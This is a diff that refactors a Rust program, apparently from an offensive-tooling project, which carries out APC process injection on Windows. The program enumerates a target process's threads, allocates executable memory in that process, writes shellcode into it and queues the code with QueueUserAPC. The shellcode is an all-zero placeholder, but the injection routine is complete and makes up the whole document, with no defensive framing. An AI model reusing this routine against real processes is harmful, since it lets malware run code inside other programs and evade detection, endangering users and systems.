@@ -1,10 +1,10 @@
 use std::{
     env::args,
-    mem::{offset_of, size_of, transmute},
+    mem::{size_of, transmute},
 };
 use windows::{
     Win32::{
-        Foundation::{CloseHandle, GetLastError, PAPCFUNC},
+        Foundation::{CloseHandle, HANDLE, PAPCFUNC},
         System::{
             Diagnostics::{
                 Debug::WriteProcessMemory,
@@ -22,99 +22,94 @@ use windows::{
     core::{Error, HRESULT, Result},
 };
 
+struct HandleGuard(HANDLE);
+
+impl Drop for HandleGuard {
+    fn drop(&mut self) {
+        unsafe {
+            if !self.0.is_invalid() {
+                let _ = CloseHandle(self.0);
+            }
+        }
+    }
+}
+
 fn main() -> Result<()> {
     let shellcode: [u8; 460] = [0x00; 460];
 
     let pid: u32 = match args().nth(1) {
-        Some(arg) => arg.parse().map_err(|_| Error::from_thread())?,
+        Some(arg) => arg
+            .parse()
+            .map_err(|_| Error::new(HRESULT(0), "Invalid PID argument"))?,
         None => {
             eprintln!("Usage: ./injectum_async_procedure_calls.exe <PID>");
             return Ok(());
         }
     };
 
-    unsafe {
-        let mut thread_id: u32 = 0;
+    let h_snapshot = HandleGuard(unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)? });
 
-        let h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)?;
-        if h_snapshot.is_invalid() {
-            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
+    let mut t_entry = THREADENTRY32 {
+        dwSize: size_of::<THREADENTRY32>() as u32,
+        ..Default::default()
+    };
+
+    unsafe { Thread32First(h_snapshot.0, &mut t_entry)? }
+
+    let mut thread_id = 0u32;
+
+    loop {
+        if t_entry.th32OwnerProcessID == pid {
+            thread_id = t_entry.th32ThreadID;
+            break;
         }
 
-        let mut t_entry = THREADENTRY32::default();
         t_entry.dwSize = size_of::<THREADENTRY32>() as u32;
 
-        Thread32First(h_snapshot, &mut t_entry)?;
-
-        loop {
-            if t_entry.dwSize
-                >= (offset_of!(THREADENTRY32, th32OwnerProcessID) + size_of::<u32>()) as u32
-            {
-                if t_entry.th32OwnerProcessID == pid {
-                    thread_id = t_entry.th32ThreadID;
-                    break;
-                }
-            }
-
-            t_entry.dwSize = size_of::<THREADENTRY32>() as u32;
-
-            if Thread32Next(h_snapshot, &mut t_entry).is_err() {
-                break;
-            }
+        if unsafe { Thread32Next(h_snapshot.0, &mut t_entry) }.is_err() {
+            break;
         }
+    }
 
-        if thread_id == 0 {
-            CloseHandle(h_snapshot)?;
-            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
-        }
+    if thread_id == 0 {
+        return Ok(());
+    }
 
-        let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, pid)?;
-        if h_process.is_invalid() {
-            CloseHandle(h_snapshot)?;
-            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
-        }
+    let h_process = HandleGuard(unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid)? });
 
-        let h_memory = VirtualAllocEx(
-            h_process,
+    let h_memory = unsafe {
+        VirtualAllocEx(
+            h_process.0,
             None,
             shellcode.len(),
             MEM_COMMIT | MEM_RESERVE,
             PAGE_EXECUTE_READWRITE,
-        );
-        if h_memory.is_null() {
-            CloseHandle(h_process)?;
-            CloseHandle(h_snapshot)?;
-            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
-        }
+        )
+    };
 
-        let mut bytes_written: usize = 0;
+    if h_memory.is_null() {
+        return Ok(());
+    }
+
+    let mut bytes_written = 0usize;
+
+    unsafe {
         WriteProcessMemory(
-            h_process,
+            h_process.0,
             h_memory,
             shellcode.as_ptr().cast(),
             shellcode.len(),
             Some(&mut bytes_written),
-        )?;
+        )?
+    }
 
-        let h_thread = OpenThread(THREAD_ALL_ACCESS, false, thread_id)?;
-        if h_thread.is_invalid() {
-            CloseHandle(h_process)?;
-            CloseHandle(h_snapshot)?;
-            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
-        }
+    let h_thread = HandleGuard(unsafe { OpenThread(THREAD_ALL_ACCESS, false, thread_id)? });
 
-        let papc_func: PAPCFUNC = transmute(h_memory);
-        if QueueUserAPC(papc_func, h_thread, 0) == 0 {
-            CloseHandle(h_thread)?;
-            CloseHandle(h_process)?;
-            CloseHandle(h_snapshot)?;
-            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
-        }
+    let papc_func: PAPCFUNC = unsafe { transmute(h_memory) };
 
-        CloseHandle(h_thread)?;
-        CloseHandle(h_process)?;
-        CloseHandle(h_snapshot)?;
-    };
+    if unsafe { QueueUserAPC(papc_func, h_thread.0, 0) } == 0 {
+        return Ok(());
+    }
 
     Ok(())
 }
